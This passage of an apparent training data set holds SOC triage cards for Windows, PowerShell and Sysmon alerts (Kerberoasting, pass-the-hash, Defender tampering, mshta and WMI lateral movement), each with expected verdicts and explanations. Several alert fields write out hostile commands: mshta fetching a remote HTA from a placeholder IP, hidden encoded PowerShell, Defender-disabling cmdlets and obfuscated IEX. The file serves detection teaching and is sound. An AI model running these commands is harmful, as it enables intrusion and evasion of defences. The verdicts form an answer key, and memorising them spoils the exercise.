        "related": "Query: {wks}, ±20 min\n→ Task action decodes to a download-cradle to {ext_ip}\n→ Created by {user} 4 min after an .lnk was opened from a zip attachment\n→ Task name impersonates a real Windows path but lives under a user-created folder",
        "asset": "{wks} — standard workstation, {dept}.",
        "user": "{user} — {dept}, not IT. No business creating scheduled tasks, especially ones running hidden encoded PowerShell.",
        "reputation": "{ext_ip} → VT 21/94. Decoded action is IEX download-and-run.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "Task action (hidden/encoded PowerShell, download cradle), logon/short-interval trigger, name impersonating Windows components, who created it.",
    "explanation": "A logon-triggered task running hidden encoded PowerShell that pulls from a flagged IP, created by a non-IT user right after opening an attachment, is malware persistence disguised with a Windows-like name. Escalate for isolation.",
    "event_type_pool": ["Scheduled task creation — legitimate software", "Malicious script execution", "WMI event subscription persistence", "Persistence via registry run key"],
},
{
    "id": "win_4698_backup_legit",
    "source": "Windows Security",
    "event_type": "Scheduled task creation — legitimate software",
    "mitre": "T1053.005 – Scheduled Task (ruled out)",
    "alert": (
        "EventID: 4698 (A scheduled task was created)\n"
        "Task Name: \\Veeam\\Veeam Agent Backup Job\n"
        "Author: svc.backup\n"
        "Action: \"C:\\Program Files\\Veeam\\Endpoint Backup\\Veeam.EndPoint.Manager.exe\"\n"
        "Trigger: Daily 02:00\n"
        "Computer: {srv}"
    ),
    "pivots": {
        "related": "Query: same task fleet-wide, last 7 days\n→ Created on the backup-in-scope servers during the Veeam agent rollout (change CHG-2260)\n→ Action is a signed Veeam binary in Program Files; runs 02:00 nightly, no network beyond the backup repo",
        "asset": "{srv} — server in nightly backup scope.",
        "user": "svc.backup — documented backup service account. Change CHG-2260 (Veeam agent deploy) approved.",
        "reputation": "Veeam binary — vendor-signed, Program Files path. No suspicious network.",
    },
    "verdict": "false_positive",
    "action": "close",
    "required_pivots": ["related", "user"],
    "what_to_check": "Task action path/signature (Program Files signed vs encoded PowerShell), schedule, matching rollout ticket, service-account author.",
    "explanation": "A signed Veeam backup task on a nightly schedule from the backup service account under an approved rollout is expected software behaviour. Close, reference CHG-2260. The malicious 4698 twin runs hidden encoded PowerShell on a logon trigger — action and trigger are the discriminators.",
    "event_type_pool": ["Scheduled task persistence — malicious", "Persistence via registry run key", "Administrative script — expected activity", "Malicious script execution"],
},
{
    "id": "win_4769_kerberoast",
    "source": "Windows Security",
    "event_type": "Kerberoasting",
    "mitre": "T1558.003 – Kerberoasting",
    "alert": (
        "EventID: 4769 (A Kerberos service ticket was requested)\n"
        "Account: {user}\n"
        "Service Name: multiple SPNs (MSSQLSvc, HTTP, CIFS, svc_*)\n"
        "Ticket Encryption Type: 0x17 (RC4-HMAC)\n"
        "Computer: DC-01\n"
        "Time: {hh_off} PT"
    ),
    "pivots": {
        "related": "Query: 4769 for {user}, last 15 min\n→ 34 service-ticket requests for distinct SPNs, all RC4 (0x17), in 90 seconds\n→ Normal clients request AES (0x12); RC4 is forced to enable offline cracking\n→ {user} session originates from {int_ip} where Rubeus-like activity was seen",
        "asset": "DC-01 — domain controller (KDC). Bulk SPN ticket requests target crackable service accounts.",
        "user": "{user} — {dept} standard user. No reason to request tickets for dozens of service SPNs.",
        "reputation": "{int_ip} — internal {dept} workstation. RC4 downgrade + volume = roasting tool.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "user"],
    "what_to_check": "Volume of 4769 for distinct SPNs in a short window, RC4 (0x17) encryption downgrade, whether the requester is a normal user vs an app.",
    "explanation": "A user pulling dozens of RC4 service tickets for many SPNs in seconds is Kerberoasting — harvesting crackable service-account hashes offline. RC4 is deliberately forced because AES tickets are far harder to crack. Escalate: expect service-account password cracking next; rotate exposed service creds.",
    "event_type_pool": ["AS-REP roasting", "DCSync / replication rights abuse", "Brute force / password guessing", "Privileged logon — expected service activity"],
},
{
    "id": "win_4768_asrep",
    "source": "Windows Security",
    "event_type": "AS-REP roasting",
    "mitre": "T1558.004 – AS-REP Roasting",
    "alert": (
        "EventID: 4768 (A Kerberos authentication ticket (TGT) was requested)\n"
        "Accounts: several service/legacy accounts\n"
        "Pre-Authentication Type: 0 (not required)\n"
        "Ticket Encryption Type: 0x17 (RC4-HMAC)\n"
        "Source: {int_ip}\n"
        "Computer: DC-01"
    ),
    "pivots": {
        "related": "Query: 4768 preauth-0 requests, last 15 min\n→ 8 accounts with 'Do not require Kerberos preauthentication' set, all TGTs pulled from {int_ip} in 1 min\n→ RC4 encoded → crackable AS-REP hashes\n→ No legitimate client requests TGTs for accounts it does not own",
        "asset": "DC-01 — KDC. Accounts with preauth disabled are the roastable set.",
        "user": "Origin {int_ip} — {dept} workstation. Enumerating and pulling AS-REPs for multiple accounts.",
        "reputation": "Preauth-not-required + RC4 + bulk from one host = AS-REP roasting tool (Rubeus/GetNPUsers).",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "4768 with pre-auth type 0 (not required) for multiple accounts from one source, RC4 encryption, whether those accounts legitimately request their own TGTs.",
    "explanation": "Bulk TGT requests for accounts that don't require Kerberos pre-auth, from a single workstation, harvest AS-REP hashes for offline cracking. Escalate and fix the root cause: enable pre-auth on those accounts. Distinct from Kerberoasting (which targets SPNs via 4769); this targets preauth-disabled accounts via 4768.",
    "event_type_pool": ["Kerberoasting", "Brute force / password guessing", "DCSync / replication rights abuse", "Password spray / distributed lockout"],
},
{
    "id": "win_4776_pth",
    "source": "Windows Security",
    "event_type": "Pass-the-hash",
    "mitre": "T1550.002 – Pass the Hash",
    "alert": (
        "EventID: 4776 (The domain controller attempted to validate credentials)\n"
        "Logon Account: {admin}\n"
        "Source Workstation: {wks}\n"
        "Auth Package: MICROSOFT_AUTHENTICATION_PACKAGE_V1_0 (NTLM)\n"
        "Computer: DC-01"
    ),
    "pivots": {
        "related": "Query: {admin} NTLM auth, ±20 min\n→ NTLM (not Kerberos) validations for {admin} from {wks} to 6 different hosts in 8 min\n→ {wks} is {user}'s workstation, not an admin host\n→ Followed by 7045 PSEXESVC on two targets",
        "asset": "Fleet — {admin} is being replayed across multiple hosts.",
        "user": "{admin} — IT admin. NTLM-only auth from a user workstation, fanning out, is not how this admin normally works (Kerberos from PAW).",
        "reputation": "{wks} — {dept} workstation. NTLM + multi-host + PsExec = hash replay.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "user"],
    "what_to_check": "NTLM (4776) auth for a privileged account from a non-admin host to many targets, absence of Kerberos, follow-on remote execution.",
    "explanation": "An admin account authenticating via NTLM from a user workstation across many hosts, then running PsExec, is pass-the-hash lateral movement with a stolen NTLM hash. Escalate: isolate the origin, reset the admin, and hunt the compromised hosts. Kerberos-from-PAW is normal; NTLM-multi-host-from-user-box is the anomaly.",
    "event_type_pool": ["Explicit-credential logon — lateral movement", "Remote service execution — lateral movement", "Brute force / password guessing", "Suspicious remote logon"],
},
{
    "id": "win_5145_share_recon",
    "source": "Windows Security",
    "event_type": "Network share enumeration",
    "mitre": "T1135 – Network Share Discovery",
    "alert": (
        "EventID: 5145 (A network share object was checked for access)\n"
        "Account: {user}\n"
        "Shares Accessed: C$, ADMIN$, IPC$ on many hosts\n"
        "Source Address: {int_ip}\n"
        "Computer: (multiple)"
    ),
    "pivots": {
        "related": "Query: 5145 for {user}, last 20 min\n→ Access checks on C$/ADMIN$ across 40+ hosts in 5 min (sequential IP order)\n→ Pattern matches an automated share-scan (e.g. a discovery tool), not human browsing\n→ {user} normally touches one departmental share",
        "asset": "Fleet admin shares (C$/ADMIN$) — enumeration precedes lateral movement / data staging.",
        "user": "{user} — {dept}. Never enumerates admin shares fleet-wide; this is not their baseline.",
        "reputation": "{int_ip} — {dept} workstation now scanning the fleet.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "user"],
    "what_to_check": "Volume and rate of admin-share (C$/ADMIN$) access across many hosts, sequential/automated pattern, deviation from the user's normal share usage.",
    "explanation": "Rapid, sequential admin-share access across dozens of hosts is automated network-share discovery — reconnaissance before lateral movement or data staging. Escalate: the origin is likely already compromised and mapping the environment. A user touching their own one share is normal; fleet-wide C$ sweeps are not.",
    "event_type_pool": ["Remote service execution — lateral movement", "Explicit-credential logon — lateral movement", "DCSync / replication rights abuse", "Pass-the-hash"],
},
{
    "id": "win_4738_pwdneverexpires",
    "source": "Windows Security",
    "event_type": "Account manipulation — password never expires",
    "mitre": "T1098 – Account Manipulation",
    "alert": (
        "EventID: 4738 (A user account was changed)\n"
        "Target Account: svc_legacy01\n"
        "Changed By: {admin}\n"
        "Changes: 'Password never expires' -> ENABLED; 'User cannot change password' -> ENABLED\n"
        "Computer: DC-01\n"
        "Time: {hh_off} PT"
    ),
    "pivots": {
        "related": "Query: {admin} + svc_legacy01, ±60 min\n→ {admin} session from {int_ip} (a {dept} host, off-hours)\n→ 30 min earlier svc_legacy01 was added to a privileged group\n→ Now flags set so the attacker's foothold account never rotates",
        "asset": "svc_legacy01 — dormant service account being weaponised as durable access.",
        "user": "{admin} — IT admin, but session from a non-admin host off-hours, no change ticket. Setting password-never-expires is not routine.",
        "reputation": "{int_ip} — {dept} workstation. Combined with a prior privilege add, this is persistence hardening.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "user"],
    "what_to_check": "Account-control flag changes (password-never-expires, cannot-change) on a service/dormant account, who changed it and from where, correlated privilege changes.",
    "explanation": "Setting password-never-expires (plus lock-out of password change) on a dormant account, off-hours from a non-admin host after a privilege grant, is an attacker making a foothold account permanent. Escalate: this account is being groomed for durable access; review the whole change chain.",
    "event_type_pool": ["Privileged group modification — unauthorized", "Unauthorized account creation", "Account manipulation — expected onboarding", "Group membership change — onboarding"],
},
{
    "id": "win_4964_special_logon_fp",
    "source": "Windows Security",
    "event_type": "Special-groups logon — expected admin",
    "mitre": "T1078 – Valid Accounts (ruled out)",
    "alert": (
        "EventID: 4964 (Special groups have been assigned to a new logon)\n"
        "Account: {admin}\n"
        "Special Groups: Domain Admins, Enterprise Admins\n"
        "Logon Type: 10 (RemoteInteractive)\n"
        "Source: 10.10.5.44 (IT admin PAW)\n"
        "Computer: DC-01\n"
        "Time: {hh_biz} PT"
    ),
    "pivots": {
        "related": "Query: {admin} on DC-01, ±30 min\n→ RDP from the IT PAW (10.10.5.0/24) during a scheduled maintenance window (CHG-3301)\n→ Normal DC admin actions follow (GPO edit); no discovery/dumping\n→ {admin} logs into DCs from the PAW routinely",
        "asset": "DC-01 — domain controller. Access from the sanctioned admin path.",
        "user": "{admin} — genuine IT/domain admin. Change window CHG-3301 approved. Source is the PAW.",
        "reputation": "Source 10.10.5.44 — IT admin PAW, on the allowlist. Expected.",
    },
    "verdict": "false_positive",
    "action": "close",
    "required_pivots": ["related", "user"],
    "what_to_check": "Is the privileged logon from the sanctioned PAW/admin subnet, during a change window, by a real domain admin, with only expected follow-on actions.",
    "explanation": "A domain admin logging into a DC from the PAW during an approved maintenance window, doing normal admin work, is exactly what 4964 fires on constantly. Close. The privileged-logon MALICIOUS cards differ on source (external/user host), timing (off-hours no ticket), and follow-on (discovery/dumping) — none here.",
    "event_type_pool": ["Suspicious remote logon", "Privileged group modification — unauthorized", "Explicit-credential logon — lateral movement", "DCSync / replication rights abuse"],
},

# ===================== POWERSHELL (batch 2) =====================
{
    "id": "ps_defender_disable_rtp",
    "source": "PowerShell",
    "event_type": "Defender real-time protection disabled",
    "mitre": "T1562.001 – Impair Defenses",
    "alert": (
        "EventID: 4104 (Script Block Logging)\n"
        "Host: {wks}\n"
        "User: {user}\n"
        "ScriptBlock: Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true\n"
        "Time: {hh_biz} PT"
    ),
    "pivots": {
        "related": "Query: {wks}, ±15 min\n→ Parent: an .hta from a browser download → powershell hidden\n→ Real-time protection turned off, then a binary dropped to Temp and executed\n→ No Intune/SCCM policy push behind the change",
        "asset": "{wks} — Intune-managed workstation; AV settings are centrally enforced, never ad-hoc.",
        "user": "{user} — {dept}, not IT. No reason to disable Defender.",
        "reputation": "Dropped binary → VT 30/94. Turning off AV then dropping a payload is blind-then-run.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "user"],
    "what_to_check": "Who disabled real-time protection (central policy vs user shell), what executed immediately after, any approved change.",
    "explanation": "Disabling Defender real-time protection from a user shell right before dropping a payload is classic defense-evasion-then-execute. Escalate. The managed twin does the same via Intune with a ticket — origin and the follow-on payload decide it.",
    "event_type_pool": ["Defender exclusion — managed policy", "Defense evasion attempt", "Defender tampering — exclusion added", "Malicious script execution"],
},
{
    "id": "ps_defender_disable_managed",
    "source": "PowerShell",
    "event_type": "Defender setting change — managed policy",
    "mitre": "T1562.001 – Impair Defenses (ruled out)",
    "alert": (
        "EventID: 4104 (Script Block Logging)\n"
        "Host: {wks}\n"
        "User: SYSTEM\n"
        "ScriptBlock: Set-MpPreference -DisableRealtimeMonitoring $false; Set-MpPreference -MAPSReporting Advanced\n"
        "Time: {hh_biz} PT"
    ),
    "pivots": {
        "related": "Query: same block fleet-wide, last 6h\n→ Applied by the Intune management extension (SYSTEM) to 500+ devices, standardising AV settings\n→ It ENABLES protection (DisableRealtimeMonitoring=$false), not disables it\n→ Matches a Defender-baseline rollout (CHG-3310)",
        "asset": "{wks} — managed workstation receiving the Defender baseline.",
        "user": "SYSTEM via Intune. Change CHG-3310: 'Standardize Defender baseline, enable MAPS' — approved.",
        "reputation": "No payload, no network. Configuration hardening, fleet-wide, from the management agent.",
    },
    "verdict": "false_positive",
    "action": "close",
    "required_pivots": ["related", "user"],
    "what_to_check": "Direction of the change (enable vs disable protection), delivered by central management vs a user shell, fleet-wide vs single host, matching baseline ticket.",
    "explanation": "An Intune-pushed Defender baseline that ENABLES real-time protection across the fleet is hardening, not evasion. Close, reference CHG-3310. Read the cmdlet arguments: `-DisableRealtimeMonitoring $false` is the opposite of the attack; don't verdict on the cmdlet name alone.",
    "event_type_pool": ["Defender real-time protection disabled", "Defense evasion attempt", "Administrative script — expected activity", "Defender tampering — exclusion added"],
},
{
    "id": "ps_obfuscated_iex",
    "source": "PowerShell",
    "event_type": "Obfuscated script execution",
    "mitre": "T1027 – Obfuscated Files or Information",
    "alert": (
        "EventID: 4104 (Script Block Logging)\n"
        "Host: {wks}\n"
        "User: {user}\n"
        "ScriptBlock: & ((gv '*mdr*').name[3,11,2]-join'') (\"{{1}}{{0}}\" -f 'EX','I') (New-Object IO.StreamReader(...GzipStream...)).ReadToEnd()\n"
        "Time: {hh_biz} PT"
    ),
    "pivots": {
        "related": "Query: {wks}, ±15 min\n→ Parent WINWORD.EXE → powershell; the block reconstructs 'IEX' from characters and inflates a gzip blob\n→ Decoded payload beacons to {ext_ip}\n→ Backtick/format-operator/char-array tricks = Invoke-Obfuscation-style",
        "asset": "{wks} — standard workstation, {dept}.",
        "user": "{user} — {dept}, not a developer. Legit scripts do not hide the word 'IEX' behind char-array indexing.",
        "reputation": "{ext_ip} → VT 17/94. Obfuscation exists only to evade detection.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "Obfuscation constructs (char-array/format-operator reassembly of IEX, gzip/base64 inflate), Office parent, resulting network.",
    "explanation": "Reassembling `IEX` from indexed characters and inflating a compressed blob has one purpose: hide intent from logging and AV. Spawned by Word and beaconing out, this is a phishing payload. Escalate. Obfuscation itself, on a non-dev user box, is a strong tell.",
    "event_type_pool": ["Malicious script execution", "Encoded command — documented maintenance", "Reverse shell / interactive C2", "Defense evasion attempt"],
},
{
    "id": "ps_4103_dsc_fp",
    "source": "PowerShell",
    "event_type": "Module logging — configuration management",
    "mitre": "T1059.001 – PowerShell (ruled out)",
    "alert": (
        "EventID: 4103 (Module Logging / pipeline execution)\n"
        "Host: {srv}\n"
        "User: SYSTEM\n"
        "CommandInvocation: Start-DscConfiguration; Get-DscLocalConfigurationManager; Test-DscConfiguration\n"
        "Time: 03:15 PT"
    ),
    "pivots": {
        "related": "Query: {srv}, last 30 days\n→ Same DSC cmdlets run nightly at 03:15 under SYSTEM via the DSC engine (WinRM localhost)\n→ Enforces the documented server baseline; no external network\n→ 30-day baseline is identical",
        "asset": "{srv} — server managed by PowerShell DSC for config drift.",
        "user": "SYSTEM via the DSC Local Configuration Manager. Documented config-management tooling.",
        "reputation": "Local WinRM only; no outbound. Standard DSC operation.",
    },
    "verdict": "false_positive",
    "action": "close",
    "required_pivots": ["related", "user"],
    "what_to_check": "Are the cmdlets config-management (Start/Test-DscConfiguration) under SYSTEM on a baseline schedule, any external network, deviation from baseline.",
    "explanation": "DSC configuration cmdlets running nightly under SYSTEM to enforce a server baseline are normal config management. Close. 4103 module logging captures a lot of benign automation; judge by the cmdlets and context, not the mere presence of PowerShell logging.",
    "event_type_pool": ["Obfuscated script execution", "Administrative script — expected activity", "Malicious script execution", "Encoded command — documented maintenance"],
},
{
    "id": "ps_downgrade_v2",
    "source": "PowerShell",
    "event_type": "PowerShell version downgrade (logging/AMSI evasion)",
    "mitre": "T1562.001 – Impair Defenses",
    "alert": (
        "EventID: 4104 (Script Block Logging)\n"
        "Host: {wks}\n"
        "User: {user}\n"
        "Parent CommandLine: powershell.exe -version 2 -nop -w hidden -c IEX(...)\n"
        "Note: engine started with -version 2 (no ScriptBlock/AMSI on v2)\n"
        "Time: {hh_biz} PT"
    ),
    "pivots": {
        "related": "Query: {wks}, ±15 min\n→ powershell -version 2 launched by a temp exe; v2 predates AMSI and rich script-block logging\n→ Subsequent activity is largely invisible to 4104 by design\n→ Sysmon 1 still shows the -version 2 -w hidden IEX command line",
        "asset": "{wks} — standard workstation, {dept}. PowerShell v2 engine is legacy/rarely needed.",
        "user": "{user} — {dept}, not IT. No workflow needs the v2 engine.",
        "reputation": "Forcing -version 2 is a known logging/AMSI-evasion trick; combined with -w hidden + IEX it is malicious.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "Explicit -version 2 downgrade (bypasses AMSI + script-block logging), combined with -w hidden/IEX, launched by a non-standard parent.",
    "explanation": "Forcing the PowerShell v2 engine deliberately drops AMSI and modern script-block logging so subsequent commands run unseen — an evasion move, not a compatibility need on a user desktop. With -w hidden and IEX, escalate. The Sysmon command line still catches the downgrade even when 4104 goes quiet.",
    "event_type_pool": ["Defense evasion attempt", "Obfuscated script execution", "Malicious script execution", "Administrative script — expected activity"],
},
{
    "id": "ps_bloodhound_collect",
    "source": "PowerShell",
    "event_type": "AD reconnaissance collection",
    "mitre": "T1059.001 – PowerShell / T1087 – Account Discovery",
    "alert": (
        "EventID: 4104 (Script Block Logging)\n"
        "Host: {wks}\n"
        "User: {user}\n"
        "ScriptBlock: Invoke-BloodHound -CollectionMethod All -Domain corp.local; Get-DomainUser -SPN; Get-DomainController\n"
        "Time: {hh_biz} PT"
    ),
    "pivots": {
        "related": "Query: {wks}, ±20 min\n→ Mass LDAP queries to DC-01 enumerating users, groups, ACLs, sessions, trusts\n→ A .zip of collected JSON written to Temp (BloodHound output)\n→ {user} is not IT and runs no AD tooling normally",
        "asset": "Active Directory — full graph collection maps attack paths to Domain Admins.",
        "user": "{user} — {dept}, standard user. SharpHound/PowerView collection is adversary tradecraft here.",
        "reputation": "Invoke-BloodHound / Get-Domain* are PowerView/SharpHound; the JSON zip is the collection artifact.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "user"],
    "what_to_check": "AD-enumeration tooling (BloodHound/PowerView cmdlets), mass LDAP to the DC, collection output (JSON/zip), whether the user has any AD-admin role.",
    "explanation": "BloodHound/PowerView collection from a non-IT user's box is active AD reconnaissance — the attacker is mapping the shortest path to Domain Admin. Escalate: enumeration precedes privilege escalation and lateral movement. The JSON/zip output confirms a completed collection.",
    "event_type_pool": ["Obfuscated script execution", "Kerberoasting", "Malicious script execution", "Network share enumeration"],
},

# ===================== SYSMON (batch 2) =====================
{
    "id": "sysmon_mshta_remote",
    "source": "Sysmon",
    "event_type": "Signed binary proxy execution (mshta)",
    "mitre": "T1218.005 – Mshta",
    "alert": (
        "Sysmon EventID: 1 (Process Create)\n"
        "Image: C:\\Windows\\System32\\mshta.exe\n"
        "CommandLine: mshta.exe http://{ext_ip}/a.hta\n"
        "ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\n"
        "User: {user}\n"
        "Computer: {wks}"
    ),
    "pivots": {
        "related": "Query: {wks}, ±15 min\n→ OUTLOOK → mshta fetching a remote .hta → the HTA runs VBScript → powershell → outbound 443 to {ext_ip}\n→ mshta pulling a remote HTA has no business use",
        "asset": "{wks} — standard workstation, {dept}.",
        "user": "{user} — {dept}. Outlook spawning mshta is not a normal workflow.",
        "reputation": "{ext_ip} → VT 16/94, HTA host, {bad_country}.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "mshta.exe fetching a remote http .hta, Office as parent, the follow-on script + C2.",
    "explanation": "mshta.exe executing a remote HTA is a signed-binary proxy-execution LOLBin with essentially no legitimate desktop use; spawned by Outlook and chaining to C2, it is a live phishing execution. Escalate for isolation.",
    "event_type_pool": ["Living-off-the-land binary abuse", "Signed binary proxy execution (regsvr32)", "Phishing payload execution", "Malicious script execution"],
},
{
    "id": "sysmon_wmic_lateral",
    "source": "Sysmon",
    "event_type": "Remote WMI process execution — lateral movement",
    "mitre": "T1047 – Windows Management Instrumentation",
    "alert": (
        "Sysmon EventID: 1 (Process Create)\n"
        "Image: C:\\Windows\\System32\\wbem\\WMIC.exe\n"
        "CommandLine: wmic /node:{srv} /user:{admin} process call create \"powershell -nop -w hidden -enc <b64>\"\n"
        "ParentImage: C:\\Windows\\System32\\cmd.exe\n"
        "User: {user}\n"
        "Computer: {wks}"
    ),
    "pivots": {
        "related": "Query: {wks}, ±15 min\n→ wmic /node remote process-create against {srv} (and 3 more hosts) launching hidden encoded PowerShell\n→ Origin {wks} is {user}'s box, using {admin} creds\n→ Sysmon 3 on targets shows the spawned powershell beaconing to {ext_ip}",
        "asset": "{srv} — target of remote WMI code execution; part of a multi-host sweep.",
        "user": "{user} — {dept}, using admin creds to remotely execute on servers. Not their role.",
        "reputation": "{ext_ip} → C2. wmic /node process-create of hidden PowerShell = WMI lateral movement.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "wmic /node ... process call create launching hidden/encoded PowerShell, multi-host fan-out, resulting C2 on targets.",
    "explanation": "wmic /node remote process-create spawning hidden encoded PowerShell across multiple servers is WMI lateral movement. Escalate: isolate the origin and scope each target. WMIC for inventory is normal; WMIC remotely creating hidden PowerShell processes is not.",
    "event_type_pool": ["Remote WMI query — SCCM inventory", "Remote service execution — lateral movement", "Explicit-credential logon — lateral movement", "Malicious script execution"],
},
{
    "id": "sysmon_wmic_sccm_fp",
    "source": "Sysmon",
    "event_type": "Remote WMI query — SCCM inventory",
    "mitre": "T1047 – WMI (ruled out)",
    "alert": (
        "Sysmon EventID: 1 (Process Create)\n"
        "Image: C:\\Windows\\System32\\wbem\\WMIC.exe\n"
        "CommandLine: wmic /namespace:\\\\root\\cimv2 path Win32_Product get Name,Version /format:csv\n"
        "ParentImage: C:\\Windows\\CCM\\CcmExec.exe\n"
        "User: SYSTEM\n"
        "Computer: {wks}"
    ),
    "pivots": {
        "related": "Query: same WMIC pattern fleet-wide, last 24h\n→ Read-only Win32_Product inventory query on 600+ hosts, parent CcmExec.exe (SCCM agent), SYSTEM\n→ No /node remote-exec, no process-create; local read only",
        "asset": "{wks} — managed workstation in the SCCM inventory collection.",
        "user": "SYSTEM via the SCCM agent. Software inventory is scheduled SCCM behaviour.",
        "reputation": "No network, no remote node, no process-create. Local WMI read only.",
    },
    "verdict": "false_positive",
    "action": "close",
    "required_pivots": ["related", "user"],
    "what_to_check": "WMIC action (read-only get vs process call create), parent (CcmExec vs cmd), /node remote target present or not, fleet-wide uniform pattern.",
    "explanation": "A read-only Win32_Product inventory query from the SCCM agent under SYSTEM is routine software inventory. Close. The lateral-movement WMIC twin uses /node against remote hosts with `process call create` launching hidden PowerShell — the verb and the remote node are the discriminators.",
    "event_type_pool": ["Remote WMI process execution — lateral movement", "Administrative script — expected activity", "Scheduled task creation — legitimate software", "Living-off-the-land binary abuse"],
},
{
    "id": "sysmon_ads_zone",
    "source": "Sysmon",
    "event_type": "Alternate data stream / mark-of-the-web abuse",
    "mitre": "T1564.004 – Hide Artifacts: NTFS ADS",
    "alert": (
        "Sysmon EventID: 15 (FileCreateStreamHash)\n"
        "TargetFilename: C:\\Users\\{user}\\AppData\\Local\\Temp\\inv.pdf:payload.exe\n"
        "Contents: (executable written into an alternate data stream)\n"
        "Image: C:\\Windows\\System32\\cmd.exe\n"
        "Computer: {wks}"
    ),
    "pivots": {
        "related": "Query: {wks}, ±15 min\n→ An .exe was written into an ADS of a benign-looking PDF, then executed via wmic/forfiles from the stream\n→ Hiding a payload in a stream evades tools that scan only the primary file\n→ Followed by outbound to {ext_ip}",
        "asset": "{wks} — standard workstation, {dept}.",
        "user": "{user} — {dept}. Writing executables into NTFS alternate data streams is not a user workflow.",
        "reputation": "ADS hiding + stream execution = defense evasion; {ext_ip} flagged.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "Executable content written into an ADS (filename:stream), execution from the stream, the follow-on network.",
    "explanation": "Stashing an executable in an NTFS alternate data stream and running it from there hides the payload from scanners that only inspect the primary file — a defense-evasion technique with no benign desktop use. Escalate.",
    "event_type_pool": ["Living-off-the-land binary abuse", "Defense evasion attempt", "Persistence via registry run key", "Malicious script execution"],
},
{
    "id": "sysmon_timestomp",
    "source": "Sysmon",
    "event_type": "Timestomping — anti-forensics",
    "mitre": "T1070.006 – Timestomp",
    "alert": (
        "Sysmon EventID: 2 (A process changed a file creation time)\n"
        "TargetFilename: C:\\Windows\\System32\\wuhelper.exe\n"
        "Previous Creation Time: today {hh_off}\n"
        "New Creation Time: 2019-03-14 04:12:07 (backdated)\n"
        "Image: C:\\Users\\{user}\\AppData\\Local\\Temp\\drop.exe\n"
        "Computer: {wks}"
    ),
    "pivots": {
        "related": "Query: {wks}, ±20 min\n→ A dropped exe backdated its own copy in System32 to blend with OS files\n→ The file was created minutes ago but now shows a 2019 timestamp\n→ Part of a persistence + anti-forensics chain (Run key also set)",
        "asset": "{wks} — standard workstation, {dept}.",
        "user": "{user} — {dept}. Nothing legitimate rewrites file creation times to the past.",
        "reputation": "Backdating a just-created binary into System32 = timestomp to evade timeline analysis.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "reputation"],
    "what_to_check": "File creation time changed to the past (Sysmon 2), especially on a newly-dropped binary in a system path, correlated persistence.",
    "explanation": "Backdating a freshly-dropped binary's creation time to years ago is timestomping — anti-forensics to hide the artifact in timeline analysis and blend with OS files. No legitimate process does this. Escalate.",
    "event_type_pool": ["Security log cleared — anti-forensics", "Persistence via registry run key", "Defense evasion attempt", "DLL search-order hijack / sideload"],
},
{
    "id": "sysmon_raw_disk",
    "source": "Sysmon",
    "event_type": "Raw disk access — credential/data theft",
    "mitre": "T1006 – Direct Volume Access",
    "alert": (
        "Sysmon EventID: 9 (RawAccessRead)\n"
        "Device: \\\\.\\C:\n"
        "Image: C:\\Users\\{user}\\AppData\\Local\\Temp\\dd.exe\n"
        "Computer: {srv}\n"
        "User: {admin}"
    ),
    "pivots": {
        "related": "Query: {srv}, ±20 min\n→ A Temp-dropped tool opened raw \\\\.\\C: to bypass file locks and read NTDS.dit / registry hives directly\n→ Followed by a copy of ntds.dit + SYSTEM hive to a staging folder, then outbound\n→ Runs on a DC where raw volume reads are never routine",
        "asset": "{srv} — domain controller. Raw volume reads bypass the lock on ntds.dit.",
        "user": "{admin} — session from {int_ip} (non-admin host), off-hours. Not a backup workflow (Veeam uses VSS, not raw reads).",
        "reputation": "Raw \\\\.\\C: read by a Temp tool on a DC = direct-volume credential theft.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "user"],
    "what_to_check": "Raw device access (\\\\.\\C:) by an unusual/Temp binary, especially on a DC, followed by copying ntds.dit / hives.",
    "explanation": "Reading the raw volume with a dropped tool bypasses the file lock on ntds.dit to steal the domain credential database directly — a direct-volume-access credential dump. On a DC, off-hours, from a non-admin session, escalate at top priority alongside DCSync/VSS patterns.",
    "event_type_pool": ["NTDS.dit extraction on DC", "Credential dumping attempt", "DCSync / replication rights abuse", "Vulnerable driver load (BYOVD)"],
},
{
    "id": "sysmon_reg_defender_disable",
    "source": "Sysmon",
    "event_type": "Registry tampering — disable Defender",
    "mitre": "T1562.001 – Impair Defenses",
    "alert": (
        "Sysmon EventID: 13 (Registry value set)\n"
        "TargetObject: HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware\n"
        "Details: DWORD 0x00000001\n"
        "Image: C:\\Users\\{user}\\AppData\\Local\\Temp\\svc.exe\n"
        "Computer: {wks}"
    ),
    "pivots": {
        "related": "Query: {wks}, ±15 min\n→ A Temp binary set DisableAntiSpyware=1 and DisableRealtimeMonitoring=1 in the Defender policy key\n→ Not delivered by GPO/Intune (no management-agent parent)\n→ Immediately followed by additional payload execution",
        "asset": "{wks} — Intune-managed; Defender policy keys are set centrally, never by a Temp exe.",
        "user": "{user} — {dept}. A user-Temp binary editing Defender policy keys is tampering.",
        "reputation": "Direct registry disable of Defender by an untrusted binary = defense evasion.",
    },
    "verdict": "malicious",
    "action": "escalate",
    "required_pivots": ["related", "asset"],
